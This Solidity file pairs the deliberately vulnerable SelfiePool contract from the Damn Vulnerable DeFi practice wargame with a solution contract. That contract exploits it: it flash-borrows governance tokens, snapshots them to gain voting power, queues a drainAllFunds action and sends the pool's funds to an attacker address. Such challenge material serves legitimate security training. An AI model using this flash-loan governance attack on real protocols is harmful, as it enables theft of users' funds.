// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfiePool is ReentrancyGuard {
    using Address for address;

    ERC20Snapshot public token;
    SimpleGovernance public governance;

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        require(
            msg.sender == address(governance),
            "Only governance can execute this action"
        );
        _;
    }

    constructor(address tokenAddress, address governanceAddress) {
        token = ERC20Snapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        token.transfer(msg.sender, borrowAmount);

        require(msg.sender.isContract(), "Sender must be a deployed contract");
        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveTokens(address,uint256)",
                address(token),
                borrowAmount
            )
        );

        uint256 balanceAfter = token.balanceOf(address(this));

        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }

    //only the SimpleGovernance contract can call this function.
    function drainAllFunds(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
}

contract SelfieSolution {
    SelfiePool public selfiePool;
    ERC20Snapshot public tokenContract;
    DamnValuableTokenSnapshot public tokenContract1;
    SimpleGovernance public govContract;
    address payable public selfiAddr;
    address payable public tokenAddr;
    address payable public govAddr;
    address public attackerAddr;
    uint snap_id;
    uint snap_balance;

    constructor(
        address payable addr1,
        address payable addr2,
        address addr3,
        address payable addr4
    ) {
        //
        selfiAddr = addr1;
        tokenAddr = addr2;
        attackerAddr = addr3;
        govAddr = addr4;

        selfiePool = SelfiePool(selfiAddr);
        tokenContract = ERC20Snapshot(tokenAddr);
        govContract = SimpleGovernance(govAddr);
    }

    function attack(uint amount) public payable {
        selfiePool.flashLoan(amount);
        //transfer tokens to attacker
    }

    function getSnap() public view returns (uint, uint) {
        return (snap_id, snap_balance);
    }

    function receiveTokens(address payable addr, uint amount) external payable {
        // from SimpleGovernance -> to SelfiPool, to run drainAllFunds(attackerContract)
        bytes memory calldata1 = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );

        //the attackerContract already owns the tokens
        //before queueAction I need to call the snapshot
        tokenContract1 = DamnValuableTokenSnapshot(addr);

        snap_id = tokenContract1.snapshot(); //this will make snapshot id for this address non-zero, as this will be the first snapshot.
        snap_balance = tokenContract1.getBalanceAtLastSnapshot(address(this));

        //send the command to queue the action
        snap_id = govContract.queueAction(selfiAddr, calldata1, 0);

        //repay the flash loan
        //this loan was taken just to show bank balance so that we can execute the action (2 days later)
        tokenContract = ERC20Snapshot(addr);
        tokenContract.transfer(selfiAddr, amount);
    }

    function attack_complete() public {
        tokenContract.transfer(
            attackerAddr,
            tokenContract.balanceOf(address(this))
        );
    }

    //to receive the flash loan.
    // receive() external payable {}
}
